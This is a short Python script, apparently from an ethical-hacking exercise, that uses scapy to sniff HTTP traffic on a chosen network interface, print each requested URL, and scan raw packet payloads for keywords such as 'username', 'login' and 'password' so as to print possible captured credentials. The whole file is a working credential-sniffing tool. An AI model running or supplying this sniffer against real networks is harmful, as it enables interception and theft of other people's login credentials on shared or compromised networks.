import optparse
import scapy.all as scapy
from scapy.layers import http

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest = "interface", help = "Interface to be sniffed.")
    (options, arguments) = parser.parse_args()

    if not options.interface:
        parser.error("[-] Please specify an interface, use --help for more info.")

    return options

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load_contents = packet[scapy.Raw].load

        keywords = ["email", "username", "user", "login", "password", "passwd", "pass"]
        for keyword in keywords:
            if keyword in load_contents:
                return load_contents

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("\033[94m[+]\033[0m HTTP request: " + get_url(packet))

        login_info = get_login_info(packet)
        if login_info:
            print("\033[92m[+]\033[0m Possible username/password : " + login_info + "\033[0m")

args = get_arguments()
sniff(args.interface)
